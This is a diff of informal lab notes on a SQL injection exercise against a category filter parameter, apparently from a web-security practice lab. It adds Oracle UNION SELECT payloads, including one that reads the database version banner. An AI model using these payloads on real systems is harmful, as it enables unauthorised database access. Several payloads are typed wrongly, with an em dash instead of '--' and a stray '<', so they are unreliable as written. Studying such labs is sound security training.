@@ -13,5 +13,11 @@ so original command in the repeater is --> GET /filter?category=Tech+gifts
 now after add ' after original command their is 500 error so 
 adding '-- after original command so (-- used for comment in sql) click send their is no error.
 so we have to inject malicious script before(--) and after(') script must be contain UNION keyword,so
-1.first command--> '+UNION+SELECT+NULL--        then click send.500 internal server error.
-2.second command--> '+UNION+SELECT+NULL<NULL--   then click send.
+oracle:- 
+
+ category=Gifts'UNION+SELECT+null,null+FROM+dual—
+
+category=Gifts'UNION+SELECT+null,banner+FROM+v$version—
+after this command we have solved.
+
+category=paramerter’—  
